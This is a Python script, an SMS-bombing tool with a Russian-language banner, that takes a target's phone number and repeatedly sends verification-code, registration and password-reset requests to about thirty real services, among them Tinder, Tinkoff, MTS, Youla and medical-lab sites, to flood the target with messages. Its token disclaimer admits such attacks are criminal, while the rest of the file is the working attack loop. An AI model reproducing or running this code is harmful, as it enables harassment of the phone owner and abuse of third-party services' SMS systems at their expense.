import requests
import random
import time


print('''
Привет, мой дорогой друг!
Данный скрипт предназначен для отправки большого колличества СМС на определенный номер.
Данный скрипт работает исключительно с российскими номерами!
Автор этого скрипта предупреждает, что подобные атаки уголовно наказуемое деяние!
Не используйте данный скрипт во зло.
Автор этого скрипта предупреждает, что его использование разрешено только для своего абоненского номера!
Для того, что бы остановить атаку нажмите "ctrl + Z"
С любовью Опоссум! <3
''')

DEBAG = False
timer = False
iteration = 0
start_time = time.monotonic()
phone = input('Введите номер: ')
delay = input('Если хотите сделать задержку перед атакой, введите "1": ')

if delay == '1':
    delay = int(input('Введите колличество секунд до начала атаки: '))
else:
    delay = 5
if DEBAG == False:
    attak_duration = int(input('Введите время атаки в секундах(0 == бессконечность): '))
    if attak_duration == 0:
        timer = False
    else:
        timer = attak_duration < time.monotonic() - start_time
    time.sleep(delay)


if phone[0] == '+':
    phone = phone[1:]
if phone[0] == '8':
    phone = '7'+phone[1:]
if phone[0] == '9':
    phone = '7'+phone

phone9 = phone[1:]
phoneAresBank = '+'+phone[0]+'('+phone[1:4]+')'+phone[4:7]+'-'+ phone[7:9]+'-'+phone[9:11]
phone9dostavista = phone9[:3]+'+'+phone9[3:6]+'-'+phone9[6:8]+'-'+phone9[8:10]
phoneOstin = '+'+phone[0]+'+('+phone[1:4]+')'+phone[4:7]+'-'+phone[7:9]+'-'+phone[9:11]
phonePizzahut = '+'+phone[0]+' ('+phone[1:4]+') '+phone[4:7]+' '+phone[7:9]+' '+phone[9:11]
phoneGorzdrav = phone[1:4]+') '+phone[4:7]+'-'+phone[7:9]+'-'+phone[9:11]

name = ''
text = 'Sergey_Potapov'

for x in range(12):
    name = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

email = name+f'{iteration}'+'@gmail.com'


def spamm1(phone =phone):
    grab = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})

def spamm2(phone9=phone9):
    rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone9}).json()["res"]

def spamm3(phone=phone):
    belka = requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone}, headers={})

def spamm4(phone=phone):
    tinder = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, headers={})

def spamm5(phone=phone):
    vkusvill = requests.post('https://vkusvill.ru/ajax/user_v2/auth/check_phone.php', data={'USER_PHONE': phone, 'token': '*','is_retry': 'Y'})

def spamm6(phone=phone):
    karusel = requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, headers={})

def spamm7(phone = phone):
    uramobil = requests.post('https://service.uramobil.ru/profile/smstoken', json={{'PhoneNumber': phone, 'Captcha': 'rasd'}}, headers={})

def spamm8(phone=phone):
    taxiseven = requests.post('http://taxiseven.ru/auth/register', data={'phone': phone}, headers={})

def spamm9(phone=phone):
    tinkoff = requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+phone}, headers={})

def spamm10(phone=phone):
    mts = requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers={})

def spamm11(phone=phone):
    youla = requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})

def spamm12(phonePizzahut=phonePizzahut):
    pizzahut = requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': phonePizzahut, '_token':'*'})

def spamm13(phone=phone):
    rabota = requests.post('https://www.rabota.ru/remind', data={'credential': phone})

def spamm14(phone=phone):
    rutube = requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+phone})

def spamm15(phone=phone):
    citilink = requests.post('https://www.citilink.ru/registration/confirm/phone/+'+phone+'/')

def spamm16(phone=phone):
    findclone = requests.get(' https://findclone.ru/register?phone=+'+phone, params={'phone': '+'+phone})

def spamm17(text=text, name=name,phone=phone):
    pmsm = requests.post('https://ube.pmsm.org.ru/esb/os-reg/submission', json={'data': {'firstName': text, 'lastName': '***', 'phone': phone, 'email': name+'@gmail.com', 'password': name, 'passwordConfirm': name}})

def spamm18(phone=phone, name = name):
    smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': name,'phone': phone, 'promo': 'yellowforma'})

def spamm19(phone=phone):
    lenta = requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + phone})

def spamm20(phone9=phone9):
    oyorooms = requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+phone9+'&country_code=%2B7&nod=4&locale=en')

def spamm21(phone=phone):
    mvideo = requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': phone,'g-recaptcha-response': '','recaptcha': 'on'})

def spamm22(phone=phone):
    newnext = requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': '+'+phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})

def spamm23(phone=phone):
    s7 = requests.get('https://www.s7.ru/dotCMS/priority/ajaxEnrollment',params={'dispatch': 'shortEnrollmentByPhone', 'mobilePhone.countryCode': '7','mobilePhone.areaCode': phone[1:4], 'mobilePhone.localNumber': phone[4:-1]})

def spamm24(phone=phone):
    sunlight = requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone})

def spamm25(phoneGorzdrav=phoneGorzdrav):
    gorzdrav = requests.post('https://gorzdrav.org/login/register/sms/send', data={'phone': phoneGorzdrav, 'CSRFToken': '*'})

def spamm26(email=email, phone=phone):
    alpari = requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': email, 'mobile_phone': phone, 'deliveryOption': 'sms'})

def spamm27(phone=phone):
    invitro = requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone})

def spamm28(phone=phone):
    onlinesbis = requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':phone},'id':'1'})

def spamm29(phone=phone):
    psbank = requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})

def spamm30(phone=phone):
    beltelecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})

print('Началась атака!')

while DEBAG == False:
    if  timer:
        break
    try:
        spamm1()
        spamm2()
        spamm3()
        spamm4()
        spamm5()
        spamm6()
        #spamm7()
        #spamm8()
        spamm9()
        spamm10()
        spamm11()
        spamm12()
        spamm13()
        spamm14()
        spamm15()
        spamm16()
        spamm17()
        spamm18()
        spamm19()
        spamm20()
        spamm21()
        spamm22()
        #spamm23()
        spamm24()
        spamm25()
        spamm26()
        spamm27()
        spamm28()
        spamm29()
        spamm30()
    except:
        print('ERROR')
    iteration += 1
    print('Пройдено {0} кругов!'.format(iteration), 'время атаки составляет {0} сек!'.format(round(time.monotonic() - start_time)))
else:
    if DEBAG == False:
        print('Атака завершена!')

while DEBAG == True:
    print('if the error crashes, then put " # " before the function that creates this error')
    spamm1()
    spamm2()
    spamm3()
    spamm4()
    spamm5()
    spamm6()
    #spamm7()
    #spamm8()
    spamm9()
    spamm10()
    spamm11()
    spamm12()
    spamm13()
    spamm14()
    spamm15()
    spamm16()
    spamm17()
    spamm18()
    spamm19()
    spamm20()
    spamm21()
    spamm22()
    #spamm23()
    spamm24()
    spamm25()
    spamm26()
    spamm27()
    spamm28()
    spamm29()
    spamm30()
    print('No bag')
    break
